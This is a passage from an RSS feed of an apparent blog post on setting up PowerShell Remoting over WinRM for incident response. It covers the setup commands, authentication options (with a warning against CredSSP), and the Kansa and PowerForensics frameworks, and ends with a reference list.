&lt;p&gt;Alternatively, for those looking for a PowerShell command line version: Running the command below to setup WinRM locally on your test hosts is fairly painless. Options like Enterprise Deployment Tool, Logon Script, PSEXEC or WMIC can be used for deployment as required. It is also worth noting that to configure a custom listener port you are required to use a CLI based configuration.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Setup: &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Enable-PSRemoting -Force

&lt;span class=&quot;c1&quot;&gt;# Confirm WinRM is setup and responsive:&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &amp;lt;ComputerName&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Options]
&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &amp;lt;ComputerName&amp;gt; -Credential &amp;lt;Domain\User&amp;gt; -Authentication Kerberos &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/04testnoauth.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/05testwithauth.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h1 id=&quot;authentication&quot;&gt;Authentication&lt;/h1&gt;
&lt;p&gt;When using PowerShell Remoting you have the capability to configure authentication methods. The default and recommended when joined to a domain is PowerShell’s non-delegated Kerberos network logons. These authentication attempts result in network type 3 logons and no credential exposure. Other available options are Basic, CredSSP, Default, Digest, Kerberos, and Negotiate; Negotiate being recommended for non domain machines.&lt;/p&gt;

&lt;p&gt;Note: make a point not to use CredSSP as there are credential risks associated with delegating credentials.&lt;/p&gt;

&lt;p&gt;When testing in a domain to use default Kerberos authentication you do not need to specify the authentication method. There are a couple of ways to initiate a session, the simplest being a singular: “Invoke-Command” with parameters included.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/06simpleexampleNEW.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reusable sessions can also be configured using the “New-PSSession” cmdlet then calling the open session. As seen in my animation below I can invoke a session then run several commands through the open session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/gif01.gif&quot; alt=&quot;PS-Session&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally the “Enter-PSSession” cmdlet can be used for SSH like connectivity on the remote machine. In the animated example below I show some basic queries and filtering then query Sysmon logs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/gif02.gif&quot; alt=&quot;PS-Session Sysmon&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my test environment I used a specifically allocated Active Directory service account for my PowerShell Remoting use, which I then allocated into a local administrator role via group policy. Similar actions could be taken with an appropriate group with local admin rights across all machines. This is much easier to control as well as audit in Security and Windows Remote Management Event logs.&lt;/p&gt;

&lt;h1 id=&quot;whats-next&quot;&gt;What’s next?&lt;/h1&gt;
&lt;p&gt;Some good areas to start to understand capabilities or implementation code reference are the following interesting frameworks and capabilities able to leverage WinRM:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Kansa&lt;/strong&gt; - Written by Dave Hull, Kansa is a modular incident response framework that takes advantage of PowerShell remoting to enable surprisingly simple and scalable, current state data collections from Windows machines. Kansa can facilitate incident response, an environment baseline, intrusion hunting analysis, or even remediation across thousands of machines with ease. Kansa enables fairly easy way to write additional modules and a prebuilt framework to run 3rd party binaries inside its workflow.&lt;/p&gt;

&lt;p&gt;Get-Kansa: &lt;a href=&quot;https://github.com/davehull/Kansa&quot; title=&quot;Get Kansa&quot;&gt;https://github.com/davehull/Kansa&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) PowerForensics&lt;/strong&gt; - Written by Jared Atkinson, PowerForensics is a comprehensive disk forensic framework proving raw access to disk from PowerShell. Working with PowerForensics a typical analysis would occur locally, for a local or mounted drive.&lt;/p&gt;

&lt;p&gt;Jared has recently been working on a remoting solution that leverages the Assembly class’ Load method to load the PowerForensics DLL in memory. The general idea is when running a command over WinRM the local machine checks if PowerForensics is loaded, if not, the appropriate PowerForensics assembly dll is loaded in memory for the duration of the WinRM session. This capability enables remote raw drive analysis and would significantly speed up analysis times removing the need for imaging or pushing an agent.&lt;/p&gt;

&lt;p&gt;Get-PowerForensics: &lt;a href=&quot;https://github.com/Invoke-IR/PowerForensics&quot; title=&quot;Get Powerforensics&quot;&gt;https://github.com/Invoke-IR/PowerForensics&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/07Powerforensics.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Remoting capability via “Invoke-Command” is very new and still in development. Current requirement is to run “Add-PowerForensicsType” in your PS-Session although the goal is to eventually make this transparent to the user. In my testing limitations around versioning of PowerForensics appear to require ironing out so testing and tool validation are essential.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;With PowerShell Remoting over WinRM we have a flexible, yet powerful scripting language that can be used to query endpoints to collect relevant data points that an Incident Responder or Security team may require. Capable at scale, and over a communications framework included free in all modern Windows Operating systems. Although actually turning on WinRM may be difficult, it is worth some research to understand PowerShell remoting capabilities when considering future needs. A great strategy, but one used too infrequently is justifying a paid solution through showing benefits of open source capability, and comparing to relevant capability provided from a vendor.&lt;/p&gt;

&lt;p&gt;The above should provide a some food for thought and point you in the right direction for further research. Feel free to reach out if you have any questions.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;references--further-reading&quot;&gt;References / Further reading&lt;/h3&gt;
&lt;p&gt;1) Atkinson, &lt;a href=&quot;http://www.invoke-ir.com&quot;&gt;Jared. Invoke-IR&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Australian Signals Directorate. &lt;a href=&quot;http://www.asd.gov.au/publications/protect/Securing_PowerShell.pdf&quot;&gt;Securing PowerShell in the Enterprise&lt;/a&gt;, 2016&lt;/p&gt;

&lt;p&gt;3) Hofferle, Jason. &lt;a href=&quot;https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/23/an-introduction-to-powershell-remoting-part-one/&quot;&gt;Hey Scripting Guy! An Introduction to PowerShell Remoting: Part One&lt;/a&gt;, 2012&lt;/p&gt;

&lt;p&gt;4) Hull, Dave. &lt;a href=&quot;http://www.powershellmagazine.com/2014/07/18/kansa-a-powershell-based-incident-response-framework/&quot;&gt;PowerShell Magazine. Kansa overview &lt;/a&gt;, 2014&lt;/p&gt;

&lt;p&gt;5) Kazanciyan, Ryan. Hastings, Matt. &lt;a href=&quot;https://www.blackhat.com/docs/us-14/materials/us-14-Kazanciyan-Investigating-Powershell-Attacks-WP.pdf&quot;&gt;Investigating Powershell Attacks&lt;/a&gt;, 2014&lt;/p&gt;

&lt;p&gt;6) Metcalf, Sean. &lt;a href=&quot;https://adsecurity.org/wp-content/uploads/2015/01/&quot;&gt;PowerShell Security: Defending the Enterprise from the Latest Attack Platform&lt;/a&gt;, 2016.&lt;/p&gt;

&lt;p&gt;7) MSDN. &lt;a href=&quot;https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/&quot;&gt;PowerShell for the Blue Team&lt;/a&gt;, 2015&lt;/p&gt;

&lt;p&gt;8) MSDN. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa384426(v=vs.85).aspx&quot;&gt;Windows Remote Management&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;9) Upguard. &lt;a href=&quot;https://support.upguard.com/upguard/winrm-configuration.html#enabling-https-winrm&quot;&gt;WinRM Configuration: Enabling HTTPS WinRM&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 12 Jan 2017 00:00:00 +1100</pubDate>
        <link>https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</guid>
        
        <category>DFIR</category>
        
        <category>Powershell</category>
        
        
        <category>posts</category>
        
      </item>
    
  </channel>
</rss>
